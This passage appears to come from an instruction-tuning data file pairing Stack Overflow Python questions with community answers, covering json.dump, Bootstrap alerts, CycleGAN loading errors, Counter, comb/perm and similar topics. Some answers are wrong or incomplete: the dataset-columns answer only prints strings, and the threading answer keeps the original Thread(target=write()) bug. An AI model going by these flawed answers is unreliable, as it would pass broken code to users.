noreferrer\">https:\/\/blog.miguelgrinberg.com\/post\/the-flask-mega-tutorial-part-xv-a-better-application-structure<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n json.dump doesn't dump anything, and leaves me with an empty file | Python<p>I have been trying to dump a dictionary into my JSON file with the <code>json<\/code> library. However, when I dump, the file doesn't show anything inside it. Furthermore, when I read the file (using <code>open('file').read()<\/code>), it shows the data there! Can anyone help me locate this phantom data?<\/p>\n<p><code>db = {'aaaa': 'bbbb'} # This is just for testing, but the shape of the actual DB will be about the same.<\/code><\/p>\n<pre><code>\ndef write()\n    while True:\n        with open('C:\\\\Users\\\\very\\\\long\\\\path\\\\to\\\\json-file\\\\data.json', 'w') as f:\n            \n            json.dump(db, f)\n            sleep(2)\n            print('dumped')\n\n\nThread(target=write()).start()\n\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/d1kTO.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/d1kTO.png\" alt=\"Data.json showing nothing.\" \/><\/a><\/p>\n<p>Other info:<br>\nEnvironment: VSCode<br>\nPython version: 3.9.0<br>\nLibrary: json (import json)<br>\nCalled: inside a thread.<br>\nNo errors.<\/p>","output_text":"<p>Correct code:<\/p>\n<pre><code>import json\nfrom time import sleep\nfrom threading import Thread\ndb = {'aaaa': 'bbbb'} \n\ndef write():\n    while True:\n        with open('data2.json', 'w') as f:\n            json.dump(db, f)\n        print('dumped')\n        sleep(10)\n\n\nThread(target=write()).start()\n<\/code><\/pre>\n<p>In your case, data is written (flushed) into the file and instantly file is reopened for writing. I have moved sleep from &quot;with&quot; statment and now it works<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Big-O scaling - validation and representation (case: uniqueness of a list)<p>I've three different methods to check the uniqueness of entries to a list with theoretically different scaling of O(N), O(N log N) and O(N**2), whereas N is the length of the list. <\/p>\n\n<p>I do understand why these methods SHOULD scale like O(N), O(N log N) and O(N**2), but I fail to prove it numerically.<\/p>\n\n<p>The idea was simply to run each method multiple times with random list entries and varying length. Then plot the times vs list length (i.e. N). I expected that the worst case for each method\/N should SOMEWHAT scale like the theoretical prediction, but it doesn't.<\/p>\n\n<p>The code:<\/p>\n\n<pre><code>import time\nimport random\nimport matplotlib.pyplot as plt\n\n\n#O(N**2) - each loop is O(N)\ndef is_unique1(alist):\n    for i in range(len(alist)):\n        for j in range(i+1,len(alist)):\n            if alist[i] == alist[j]:\n                return False\n    return True\n\n#O(N log N) - as sort() is O(N log N)\ndef is_unique2(alist):\n    copy = list(alist)\n    copy.sort()\n    for i in range(len(alist)-1):\n        if copy[i] == copy[i+1]:\n            return False\n    return True    \n\n#O(N) - as set is O(N)\ndef is_unique3(alist):\n    aset = set(alist)\n    return len(aset) == len(alist)\n\n\ntimes = []\nlengths = []\nscale = 1.5\n\nfor i in range(1,10):\n    print('range:',10**i,'to',10**(i+1),'values calc:',int(10**(i\/scale)))\n\nfor j in range(1,10):\n    for i in range(1,int(10**(j\/scale))):\n        random.seed(42)\n        a = str(random.randint(10**j,10**(j+1)))\n        start = time.time()\n        is_unique3(a)\n        end = time.time()\n        times.append(end-start)\n        lengths.append(len(a))\n\n\nprint(min(times),max(times))\n\nplt.scatter(lengths,times,s=5)\nplt.ylabel('process time (s)')\nplt.xlabel('N (length of list)')\nplt.title('is_unique3')\nplt.grid()\nplt.ylim(0.9*min(times),1.1*max(times))\n#plt.yscale('log')\nplt.show()\n<\/code><\/pre>\n\n<p>the results:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/YRk9x.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/YRk9x.png\" alt=\"Method 1 - scaling should be O(N**2)\"><\/a><\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/NmNFh.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/NmNFh.png\" alt=\"Method 2 - scaling should be O(N log N)\"><\/a><\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/0RO13.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/0RO13.png\" alt=\"Method 3 - scaling should be O(N)\"><\/a><\/p>\n\n<p>Unfortunately I can't see a correspondence between the theoretical expectation and the numerical evaluation at all.<\/p>\n\n<p>Is it just illusionary to think one could achieve this? Is my way to do so wrong? Do I have to check EVERY possible list entry to get a correct scaling?<\/p>\n\n<p>I`m puzzled and would appreciate any hint...<\/p>\n\n######  EDIT\n\n<p>Thanks for the comments! I changed how I gather the times per process and decided to take an average per (now) 100 runs per list length. I tried to take the maximum time per 100 runs but the results looked still random. The adapted code snippet:<\/p>\n\n<pre><code>import time\nimport random\nimport numpy as np\nimport matplotlib.pyplot as plt\n\n\n#O(N**2) - each loop is O(N)\ndef is_unique1(alist):\n    for i in range(len(alist)):\n        for j in range(i+1,len(alist)):\n            if alist[i] == alist[j]:\n                return False\n    return True\n\n#O(N log N) - as sort() is O(N log N)\ndef is_unique2(alist):\n    copy = list(alist)\n    copy.sort()\n    for i in range(len(alist)-1):\n        if copy[i] == copy[i+1]:\n            return False\n    return True    \n\n#O(N) - as set is O(N)\ndef is_unique3(alist):\n    aset = set(alist)\n    return len(aset) == len(alist)\n\ntimes = []\nlengths = []\ntimes_mean = []\n#times_max = []\n\nfor j in range(500,10000,1000):\n    lengths.append(j)\n    for i in range(1,100):\n        a = []\n        for i in range(1,j):\n            a.append(random.randint(0,9))\n        start = time.perf_counter()\n        is_unique2(a)\n        end = time.perf_counter()\n        times.append(end-start)\n    times_mean.append(np.mean(times))\n    #times_max.append(np.max(times))\n\n#print(min(times),max(times))\n#print(len(lengths),len(times_mean))\n\nplt.scatter(lengths,times_mean,s=5, label='mean')\n#plt.scatter(lengths,times_max,s=5, label='max')\nplt.legend(loc='upper left')\nplt.ylabel('process time (s)')\nplt.xlabel('N (length of list)')\nplt.title('is_unique2')\nplt.grid()\nplt.ylim(0.9*min(times_mean),1.1*max(times_mean))\n#plt.yscale('log')\nplt.show()\n<\/code><\/pre>\n\n<p>and the results:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/HwUFS.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/HwUFS.png\" alt=\"enter image description here\"><\/a>\n<a href=\"https:\/\/i.stack.imgur.com\/SxBRF.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/SxBRF.png\" alt=\"enter image description here\"><\/a>\n<a href=\"https:\/\/i.stack.imgur.com\/dhRLs.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/dhRLs.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>While method 2 and 3 look like they would scale as O(N) or O(N log N) somewhat - I hope not by accident - method 1 still looks rubbish and not even close to O(N**2). Actually I expected this method, as a double loop, to be worst by a mile. <\/p>\n\n<p>Am I still missing something more general?<\/p>","output_text":"<p>You're only going up to length 10, by increments of 1. At that short an input, you're still largely covered by fixed overhead, and the distinction between adjacent values is fairly small (<code>n<\/code> vs. <code>n log n<\/code> won't show up clearly for adjacent values in any event). Try running your tests for input sizes of 100, followed by repeated doubling (200, 400, 800, etc.) if you want to get beyond fixed overheads that swamp visible results, and with enough work difference to show up clearly even with minor interpreter performance jitter (exacerbated by using <code>time.time()<\/code> rather than a more appropriate timing mechanism <a href=\"https:\/\/docs.python.org\/3\/library\/time.html#time.perf_counter\" rel=\"nofollow noreferrer\">like <code>time.perf_counter<\/code> or the like<\/a>).<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Flash messages not picking up bootstrap styling<p>First off thanks for the help.<\/p>\n<p>I created a small flask web app to track items &quot;to-do&quot;. As part of the app, I have added a number of flash messages to assist with the login, registrations, etc. I seem to have the information feeding to the browswer correctly, but the styling from the bootstrap classes are not show just plain text messages.<\/p>\n<p>Here is the base html of the flask app.<\/p>\n<pre><code>\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;\n        &lt;link href=&quot;https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.0.2\/dist\/css\/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-EVSTQN3\/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC&quot; crossorigin=&quot;anonymous&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text\/css&quot; href=&quot;{{ url_for('static', filename='ToDoList.css')}}&quot; \/&gt;\n    \n    &lt;\/head&gt;\n    &lt;body&gt;\n        &lt;header class=&quot;site-header&quot;&gt;\n            &lt;nav class=&quot;navbar navbar-expand-sm navbar-dark bg-steel fixed-top&quot;&gt;\n              &lt;div class=&quot;container&quot;&gt;\n                &lt;a class=&quot;navbar-brand mr-4&quot; href=&quot;\/&quot;&gt;Just Do It Already&lt;\/a&gt;\n                  &lt;div class=&quot;navbar-nav &quot;&gt;\n                    &lt;a class=&quot;nav-item nav-link&quot; href=&quot;{{ url_for('profile') }}&quot;&gt;Profile&lt;\/a&gt;\n                     {% if current_user.is_authenticated %}\n                           &lt;a class=&quot;nav-item nav-link&quot; href=&quot;{{ url_for('logout') }}&quot;&gt;Logout&lt;\/a&gt;\n                           &lt;a class=&quot;nav-item nav-link&quot; href=&quot;{{ url_for('new_post') }}&quot;&gt;New Task&lt;\/a&gt;\n                     {% else %}\n                            &lt;a class=&quot;nav-item nav-link&quot; href=&quot;{{ url_for('log_in') }}&quot;&gt;Login&lt;\/a&gt; \n                            &lt;a class=&quot;nav-item nav-link&quot; href=&quot;{{ url_for('register') }}&quot;&gt;Register&lt;\/a&gt;          \n                    {% endif %}\n                  &lt;\/div&gt;\n                  &lt;\/div&gt;\n              &lt;\/div&gt;\n            &lt;\/div&gt;\n            &lt;\/nav&gt;\n          &lt;\/header&gt;\n          &lt;main role=&quot;main&quot; class=&quot;container&quot;&gt;\n            &lt;div class='row'&gt;\n              &lt;div class=&quot;col-md-8 mx-auto&quot;&gt;\n                {% with messages = get_flashed_messages(with_categories=true) %}\n                  {% if messages %}\n                    {% for category, message in messages %}\n                      &lt;div class=&quot;alert alert-{{ category }}&quot;&gt;\n                        {{ message }}\n                      &lt;\/div&gt;\n                {% endfor %}\n            {% endif %}\n        {% endwith %}\n\n        {% block body %}\n        {% endblock %}\n      &lt;\/div&gt;\n      &lt;\/div&gt;\n      &lt;\/main&gt;\n      \n    \n    \n        &lt;script src=&quot;https:\/\/cdn.jsdelivr.net\/npm\/@popperjs\/core@2.10.2\/dist\/umd\/popper.min.js&quot; integrity=&quot;sha384-7+zCNj\/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;\/script&gt;\n        &lt;script src=&quot;https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.1.3\/dist\/js\/bootstrap.min.js&quot; integrity=&quot;sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5\/YESvpZ13&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;\/script&gt;\n    &lt;\/body&gt;\n&lt;\/html&gt;\n<\/code><\/pre>\n<p>My flask messages all contain categories that show in the chrome dev tools inspection, just the message is not styled.<\/p>\n<p>Any idea what i missed here?\n<a href=\"https:\/\/i.stack.imgur.com\/PuZzK.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/PuZzK.png\" alt=\"output in chrome\" \/><\/a><\/p>","output_text":"<p>There is no <code>alert-error<\/code> class in bootstrap, you need to use <code>alert-danger<\/code> or <code>alert-warning<\/code>. you can see all the options <a href=\"https:\/\/getbootstrap.com\/docs\/4.0\/components\/alerts\/\" rel=\"nofollow noreferrer\">here<\/a><\/p>\n<pre><code>&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot;&gt;\n  A simple primary alert\u2014check it out!\n&lt;\/div&gt;\n&lt;div class=&quot;alert alert-secondary&quot; role=&quot;alert&quot;&gt;\n  A simple secondary alert\u2014check it out!\n&lt;\/div&gt;\n&lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;\n  A simple success alert\u2014check it out!\n&lt;\/div&gt;\n&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;\n  A simple danger alert\u2014check it out!\n&lt;\/div&gt;\n&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;\n  A simple warning alert\u2014check it out!\n&lt;\/div&gt;\n&lt;div class=&quot;alert alert-info&quot; role=&quot;alert&quot;&gt;\n  A simple info alert\u2014check it out!\n&lt;\/div&gt;\n&lt;div class=&quot;alert alert-light&quot; role=&quot;alert&quot;&gt;\n  A simple light alert\u2014check it out!\n&lt;\/div&gt;\n&lt;div class=&quot;alert alert-dark&quot; role=&quot;alert&quot;&gt;\n  A simple dark alert\u2014check it out!\n&lt;\/div&gt;\n<\/code><\/pre>\n<p>So your category should be <code>danger<\/code> or <code>warning<\/code>, for example:<\/p>\n<pre><code>flash('Login failed etc etc', 'danger')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n pytorch cyclegann gives a Missing key error when testing<p>I have trained a model using the <a href=\"https:\/\/github.com\/junyanz\/pytorch-CycleGAN-and-pix2pix\" rel=\"nofollow noreferrer\">pix2pix pytorch implementation<\/a> and would like to test it.<\/p>\n<p>However when I test it I get the error<\/p>\n<pre><code>model [CycleGANModel] was created\nloading the model from .\/checkpoints\/cycbw50\/latest_net_G_A.pth\nTraceback (most recent call last):\n  File &quot;test.py&quot;, line 47, in &lt;module&gt;\n    model.setup(opt)               # regular setup: load and print networks; create schedulers\n  File &quot;\/media\/bitlockermount\/SmartImageToDigitalTwin\/SmartImageToDigitalTwin\/bin\/python\/cyclegann\/pytorch-CycleGAN-and-pix2pix\/models\/base_model.py&quot;, line 88, in setup\n    self.load_networks(load_suffix)\n  File &quot;\/media\/bitlockermount\/SmartImageToDigitalTwin\/SmartImageToDigitalTwin\/bin\/python\/cyclegann\/pytorch-CycleGAN-and-pix2pix\/models\/base_model.py&quot;, line 199, in load_networks\n    net.load_state_dict(state_dict)\n  File &quot;\/home\/bst\/.local\/lib\/python3.8\/site-packages\/torch\/nn\/modules\/module.py&quot;, line 846, in load_state_dict\n    raise RuntimeError('Error(s) in loading state_dict for {}:\\n\\t{}'.format(\nRuntimeError: Error(s) in loading state_dict for ResnetGenerator:\n    Missing key(s) in state_dict: &quot;model.1.bias&quot;, &quot;model.4.bias&quot;, &quot;model.7.bias&quot;, &quot;model.10.conv_block.1.bias&quot;, &quot;model.10.conv_block.5.bias&quot;, &quot;model.11.conv_block.1.bias&quot;, &quot;model.11.conv_block.5.bias&quot;, &quot;model.12.conv_block.1.bias&quot;, &quot;model.12.conv_block.5.bias&quot;, &quot;model.13.conv_block.1.bias&quot;, &quot;model.13.conv_block.5.bias&quot;, &quot;model.14.conv_block.1.bias&quot;, &quot;model.14.conv_block.5.bias&quot;, &quot;model.15.conv_block.1.bias&quot;, &quot;model.15.conv_block.5.bias&quot;, &quot;model.16.conv_block.1.bias&quot;, &quot;model.16.conv_block.5.bias&quot;, &quot;model.17.conv_block.1.bias&quot;, &quot;model.17.conv_block.5.bias&quot;, &quot;model.18.conv_block.1.bias&quot;, &quot;model.18.conv_block.5.bias&quot;, &quot;model.19.bias&quot;, &quot;model.22.bias&quot;. \n    Unexpected key(s) in state_dict: &quot;model.2.weight&quot;, &quot;model.2.bias&quot;, &quot;model.5.weight&quot;, &quot;model.5.bias&quot;, &quot;model.8.weight&quot;, &quot;model.8.bias&quot;, &quot;model.10.conv_block.2.weight&quot;, &quot;model.10.conv_block.2.bias&quot;, &quot;model.10.conv_block.6.weight&quot;, &quot;model.10.conv_block.6.bias&quot;, &quot;model.11.conv_block.2.weight&quot;, &quot;model.11.conv_block.2.bias&quot;, &quot;model.11.conv_block.6.weight&quot;, &quot;model.11.conv_block.6.bias&quot;, &quot;model.12.conv_block.2.weight&quot;, &quot;model.12.conv_block.2.bias&quot;, &quot;model.12.conv_block.6.weight&quot;, &quot;model.12.conv_block.6.bias&quot;, &quot;model.13.conv_block.2.weight&quot;, &quot;model.13.conv_block.2.bias&quot;, &quot;model.13.conv_block.6.weight&quot;, &quot;model.13.conv_block.6.bias&quot;, &quot;model.14.conv_block.2.weight&quot;, &quot;model.14.conv_block.2.bias&quot;, &quot;model.14.conv_block.6.weight&quot;, &quot;model.14.conv_block.6.bias&quot;, &quot;model.15.conv_block.2.weight&quot;, &quot;model.15.conv_block.2.bias&quot;, &quot;model.15.conv_block.6.weight&quot;, &quot;model.15.conv_block.6.bias&quot;, &quot;model.16.conv_block.2.weight&quot;, &quot;model.16.conv_block.2.bias&quot;, &quot;model.16.conv_block.6.weight&quot;, &quot;model.16.conv_block.6.bias&quot;, &quot;model.17.conv_block.2.weight&quot;, &quot;model.17.conv_block.2.bias&quot;, &quot;model.17.conv_block.6.weight&quot;, &quot;model.17.conv_block.6.bias&quot;, &quot;model.18.conv_block.2.weight&quot;, &quot;model.18.conv_block.2.bias&quot;, &quot;model.18.conv_block.6.weight&quot;, &quot;model.18.conv_block.6.bias&quot;, &quot;model.20.weight&quot;, &quot;model.20.bias&quot;, &quot;model.23.weight&quot;, &quot;model.23.bias&quot;. \n<\/code><\/pre>\n<p>The opt file for the training:<\/p>\n<pre><code>----------------- Options ---------------\n               batch_size: 1                             \n                    beta1: 0.5                           \n          checkpoints_dir: .\/checkpoints                 \n           continue_train: False                         \n                crop_size: 256                           \n                 dataroot: .\/datasets\/datasets\/boundedwalls_50_0.1\/ [default: None]\n             dataset_mode: aligned                          [default: unaligned]\n                direction: AtoB                          \n              display_env: main                          \n             display_freq: 400                           \n               display_id: 1                             \n            display_ncols: 4                             \n             display_port: 8097                          \n           display_server: http:\/\/localhost              \n          display_winsize: 256                           \n                    epoch: latest                        \n              epoch_count: 1                             \n                 gan_mode: lsgan                         \n                  gpu_ids: 0                             \n                init_gain: 0.02                          \n                init_type: normal                        \n                 input_nc: 3                             \n                  isTrain: True                             [default: None]\n                 lambda_A: 10.0                          \n                 lambda_B: 10.0                          \n          lambda_identity: 0.5                           \n                load_iter: 0                                [default: 0]\n                load_size: 286                           \n                       lr: 0.0002                        \n           lr_decay_iters: 50                            \n                lr_policy: linear                        \n         max_dataset_size: inf                           \n                    model: cycle_gan                     \n                 n_epochs: 100                           \n           n_epochs_decay: 100                           \n               n_layers_D: 3                             \n                     name: cycbw50                          [default: experiment_name]\n                      ndf: 64                            \n                     netD: basic                         \n                     netG: resnet_9blocks                \n                      ngf: 64                            \n               no_dropout: True                          \n                  no_flip: False                         \n                  no_html: False                         \n                     norm: batch                            [default: instance]\n              num_threads: 4                             \n                output_nc: 3                             \n                    phase: train                         \n                pool_size: 50                            \n               preprocess: resize_and_crop               \n               print_freq: 100                           \n             save_by_iter: False                         \n          save_epoch_freq: 5                             \n         save_latest_freq: 5000                          \n           serial_batches: False                         \n                   suffix:                               \n         update_html_freq: 1000                          \n                  verbose: False                         \n----------------- End -------------------\n<\/code><\/pre>\n<p>And when testing it I used the following testing settings<\/p>\n<pre><code>python3 test.py --dataroot .\/datasets\/datasets\/boundedwalls_50_0.1 --name cycbw50 --model pix2pix --netG resnet_9blocks --direction BtoA --dataset_mode aligned --norm batch --load_size 286\n\n----------------- Options ---------------\n             aspect_ratio: 1.0                           \n               batch_size: 1                             \n          checkpoints_dir: .\/checkpoints                 \n                crop_size: 256                           \n                 dataroot: .\/datasets\/datasets\/boundedwalls_50_0.1\/ [default: None]\n             dataset_mode: unaligned                     \n                direction: AtoB                          \n          display_winsize: 256                           \n                    epoch: latest                        \n                     eval: False                         \n                  gpu_ids: 0                             \n                init_gain: 0.02                          \n                init_type: normal                        \n                 input_nc: 3                             \n                  isTrain: False                            [default: None]\n                load_iter: 0                                [default: 0]\n                load_size: 256                           \n         max_dataset_size: inf                           \n                    model: cycle_gan                        [default: test]\n               n_layers_D: 3                             \n                     name: cycbw50                          [default: experiment_name]\n                      ndf: 64                            \n                     netD: basic                         \n                     netG: resnet_9blocks                \n                      ngf: 64                            \n               no_dropout: True                          \n                  no_flip: False                         \n                     norm: instance                      \n                 num_test: 50                            \n              num_threads: 4                             \n                output_nc: 3                             \n                    phase: test                          \n               preprocess: resize_and_crop               \n              results_dir: .\/results\/                    \n           serial_batches: False                         \n                   suffix:                               \n                  verbose: False                         \n----------------- End -------------------\n<\/code><\/pre>\n<p>Does anybody see what I'm doing wrong here? I would like to run this network such that I get results for individual images, so far the test function seems the most promising but it just crashes on this neural network.<\/p>","output_text":"<p>I think the problem here is some layer the <code>bias=None<\/code> but in testing the model required this, you should check the code for details.<\/p>\n<p>After I check your config in train and test, the <code>norm<\/code> is different. For the code in GitHub, the norm difference may set the bias term is True or False.<\/p>\n<pre><code>if type(norm_layer) == functools.partial:\n   use_bias = norm_layer.func == nn.InstanceNorm2d\nelse:\n   use_bias = norm_layer == nn.InstanceNorm2d\n\nmodel = [nn.ReflectionPad2d(3), \n         nn.Conv2d(input_nc, ngf, kernel_size=7, padding=0, bias=use_bias),\n         norm_layer(ngf),\n         nn.ReLU(True)]\n<\/code><\/pre>\n<p>You can check it <a href=\"https:\/\/github.com\/junyanz\/pytorch-CycleGAN-and-pix2pix\/blob\/f13aab8148bd5f15b9eb47b690496df8dadbab0c\/models\/networks.py#L335\" rel=\"nofollow noreferrer\">here<\/a>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to count the first element in a list with 2-tuples of strings?<p>I am trying to define a function <code>count_first_names<\/code> that input a list of names, 2-tuple of strings as in <code>(first_name,last_name)<\/code> and that returns a dictionary whose keys are first names and the values are the number of times that the first name appears on the list.<\/p>\n<p>For example, take the first 5 presidents of the U.S.,<\/p>\n<pre><code>presidents = [(&quot;George&quot;,&quot;Washington&quot;),\n              (&quot;John&quot;,&quot;Adams&quot;),\n              (&quot;Thomas&quot;,&quot;Jefferson&quot;),\n              (&quot;James&quot;, &quot;Madison&quot;),\n              (&quot;James&quot;, &quot;Monroe&quot;),]\n<\/code><\/pre>\n<p>Then, I would like to see:<\/p>\n<pre><code>count_first_names(presidents)\n{'George':1, 'John':1, 'Thomas':1, 'James':2}\n<\/code><\/pre>\n<p>First, I created an empty dictionary, and took the first element of each tuple in the list. But I am not sure what to do next. Please help?<\/p>","output_text":"<p>To count multiple items use the <a href=\"https:\/\/docs.python.org\/3\/library\/collections.html#collections.Counter\" rel=\"nofollow noreferrer\">Counter<\/a>:<\/p>\n<pre><code>collections.Counter(p[0] for p in presidents)\n# Counter({'James': 2, 'George': 1, 'John': 1, 'Thomas': 1})\n<\/code><\/pre>\n<p>The result is a <code>dict<\/code> subclass.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n What does it mean when two variables are put together in an if statement like this: variable[variable2]?<p>I'm new to python and learning from a book can't seem to find the answer I'm looking for in the book or anywhere on google. maybe I'm just not wording my questions right.<\/p>\n<p>So in the book it there is a simple tic-tac-toe game. the <code>if<\/code> statement is written like this....<\/p>\n<pre><code>if theBoard[move] == ' ':\n<\/code><\/pre>\n<p><code>theBoard<\/code> is a dictionary and <code>move<\/code> is an input. I'm wondering what does it mean when two variables sit together like that and one is inside a bracket.<\/p>","output_text":"<p>It seems like you're looking at <a href=\"https:\/\/medium.com\/byte-tales\/the-classic-tic-tac-toe-game-in-python-3-1427c68b8874\" rel=\"nofollow noreferrer\">this tic-tac-toe game<\/a>.<\/p>\n<p>As you mentioned, <code>theBoard<\/code> is a dictionary, here is it's initial condition:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>theBoard = {'7': ' ' , '8': ' ' , '9': ' ' ,\n            '4': ' ' , '5': ' ' , '6': ' ' ,\n            '1': ' ' , '2': ' ' , '3': ' ' }\n<\/code><\/pre>\n<p><a href=\"https:\/\/docs.python.org\/3\/tutorial\/datastructures.html#dictionaries\" rel=\"nofollow noreferrer\">In Python dictionaries have 'keys' and 'values'<\/a> (follow the link to learn more). In this case the keys are the numbers 1-9 and, initially at least, they are all equal to <code>' '<\/code>.<\/p>\n<p>Appending <code>[key]<\/code> to the name of the dictionary extracts that key's value.<\/p>\n<p>For example:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code># define the dict\ndictionary = {'key1':'value1', 'key2':'value2'} \n# extract value2\ndictionary['key2']\n<\/code><\/pre>\n<p>In your example <code>move<\/code> is the key, and is being used to check whether the value is <code>' '<\/code> or not.<\/p>\n<p>As mentioned above, similar syntax occurs throughout Python. It's worth reviewing the <a href=\"https:\/\/docs.python.org\/3\/tutorial\/datastructures.html#\" rel=\"nofollow noreferrer\">data structures documentation<\/a> to solidify concepts.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I get the column names in multiple datasets in python?<p>I am studying Python now.\nI'm handling 12 datasets for case study and I want to check the columns names of each datasets.<\/p>\n<ul>\n<li>names of datasets : data_202101, data_202102, ... , data_202112<\/li>\n<\/ul>\n<p>I wrote 12 same codes to check each datasets' column names like bottom.<\/p>\n<pre><code>data_202101.columns\ndata_202102.columns\n...\ndata_202112.columns\n<\/code><\/pre>\n<p>but I want to use only 1 code.\nHow I can do that?<\/p>\n<p>I tried bottom code but it doesn't work.<\/p>\n<pre><code>for i in range(1:10):\n   data = 'data_2021'+i\n   data.columns\n<\/code><\/pre>\n<p>I am really a beginner so please help me. :)<\/p>","output_text":"<p>try this code maybe can help<\/p>\n<pre><code>print([&quot;data_20210&quot;+str(i)+&quot;.columns&quot; for i in range(1,11)])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Detecting corrupt document files with python-docx<p>Can you please help me i figuring this out.\nWhile reading a .docx file from python-docx (docx.Document(file_name)), how can I detect if the docx file is correct or corrupt.<\/p>\n<p>I've got some cases where these input docx files are either empty or corrupt.\nHow can I flag these cases using this library<\/p>","output_text":"<p>There is no such feature in <code>python-docx<\/code>. Part of the reason is that while a file could be determined to be valid or invalid according to the schema in the ISO specification, many small discrepancies are permitted by each client. What is permitted varies between clients; some things that LibreOffice will accept produce a repair error in Microsoft Word, for example.<\/p>\n<p>The only reliable way to determine this is to attempt to open the file with the target client, perhaps using automation like VBA in the case of Microsoft Word.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Unique constraint violated oracle error. How can I get the insert statement of the violation in python?<p>I have a code that looks like this:<\/p>\n<pre><code>sql1 = 'select column from table'\ndb1conn.execute(sql1) \nresults = db1conn.fetchall()\n\nsql2 = 'insert into table(column) values(:1)' \ndb2conn.executemany(sql2,results)\n<\/code><\/pre>\n<p>sometimes for no known reason I get the 'Unique constraint violated' oracle error from python script. I would like python to tell me which insert statement failed when I did the executemany. how can I do this efficiently? I was thinking of preparing the sql2 statement myself using my own function. but that is probably not a good idea.<\/p>","output_text":"<p>Take a look at the batch errors <a href=\"https:\/\/github.com\/oracle\/python-cx_Oracle\/blob\/master\/samples\/BatchErrors.py\" rel=\"nofollow noreferrer\">example<\/a> from the cx_Oracle repository. That shows you how you can figure out which row caused the problem and how to use the batch errors feature so the executemany() call doesn't fail, but you still get to figure out which rows caused problems and what those problems were.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to write Combination and Permutation from 2 numbers n and k in Ruby\/Python?<p>For example, if I have 100 distinguishable dogs and I want to randomly pick 3 of them. With a pocket-size calculator, I would do 100C3 or something similar. How can I do this in Ruby and Python?<\/p>\n<p>Edition 1: My questions were solved from Razvans and Riccardo Bucco solutions. (I flipped a fair coin once to decide to whom I give a check mark and to whom I give an upvote).<\/p>\n<p>Thank you, everyone.<\/p>","output_text":"<p>You would do this in python:<\/p>\n<pre><code>from math import comb\n\nn_combinations = comb(100, 3)\n<\/code><\/pre>\n<p>Similarly, for permutations:<\/p>\n<pre><code>from math import perm\n\nn_permutations = perm(100, 3)\n<\/code><\/pre>\n<p><code>perm<\/code> and <code>comb<\/code> can be used only with python &gt; 3.8. For older versions of python please use these functions:<\/p>\n<pre><code>from math import factorial\n\ndef comb(n, k):\n    return factorial(n) \/\/ factorial(k) \/\/ factorial(n - k)\n\ndef perm(n, k=None):\n    return factorial(n) \/\/ factorial(n - (k or n))\n<\/code><\/pre>"}
